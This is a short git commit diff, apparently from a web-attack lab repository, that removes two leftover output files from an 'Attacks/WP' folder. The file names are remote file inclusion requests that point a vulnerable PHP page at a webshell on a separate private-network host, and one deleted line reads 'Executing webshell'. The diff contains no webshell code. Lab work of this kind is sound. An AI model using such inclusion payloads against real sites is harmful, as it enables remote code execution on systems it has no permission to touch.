faa2b101109e745fc534a8a09799f41d2eed4617
LeoPer02 <leocoding.p@hotmail.com>
2023-05-09 14:58:05 -0400

    Removed the rest of the residual files

--- Attacks/WP/file_inclusion.php?file=http:%2F%2F192.168.100.5:53355%2FFileInclusion%2Fmy_webshell.php
+++
@@ -1,2 +0,0 @@
-Simple page vulnerable to RFI (Remote file inclusion)<br>File passed: http://192.168.100.5:53355/FileInclusion/my_webshell.php<br>
-	Executing webshell	
--- Attacks/WP/file_inclusion.php?file=http:%2F%2F192.168.100.5:56806%2FFileInclusion%2Fmy_webshell.php
+++
@@ -1,1 +0,0 @@
-Simple page vulnerable to RFI (Remote file inclusion)<br>File passed: http://192.168.100.5:56806/FileInclusion/my_webshell.php<br>
